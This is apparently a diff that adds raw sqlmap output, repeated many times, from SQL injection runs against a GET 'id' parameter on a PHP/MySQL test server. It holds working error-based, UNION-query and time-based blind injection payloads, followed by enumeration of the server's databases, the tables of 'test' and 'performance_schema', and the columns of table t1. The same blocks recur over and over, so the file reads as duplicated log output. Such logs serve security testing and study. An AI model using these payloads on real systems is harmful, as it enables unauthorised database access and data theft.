+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+Table: t1
+[4 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| f1     | int(11) |
+| f2     | int(11) |
+| f3     | int(11) |
+| f4     | int(11) |
++--------+---------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+Table: t1
+[4 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| f1     | int(11) |
+| f2     | int(11) |
+| f3     | int(11) |
+| f4     | int(11) |
++--------+---------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+Table: t1
+[4 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| f1     | int(11) |
+| f2     | int(11) |
+| f3     | int(11) |
+| f4     | int(11) |
++--------+---------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+Table: t1
+[4 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| f1     | int(11) |
+| f2     | int(11) |
+| f3     | int(11) |
+| f4     | int(11) |
++--------+---------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: performance_schema
+[17 tables]
++----------------------------------------------+
+| cond_instances                               |
+| events_waits_current                         |
+| events_waits_history                         |
+| events_waits_history_long                    |
+| events_waits_summary_by_instance             |
+| events_waits_summary_by_thread_by_event_name |
+| events_waits_summary_global_by_event_name    |
+| file_instances                               |
+| file_summary_by_event_name                   |
+| file_summary_by_instance                     |
+| mutex_instances                              |
+| performance_timers                           |
+| rwlock_instances                             |
+| setup_consumers                              |
+| setup_instruments                            |
+| setup_timers                                 |
+| threads                                      |
++----------------------------------------------+
+
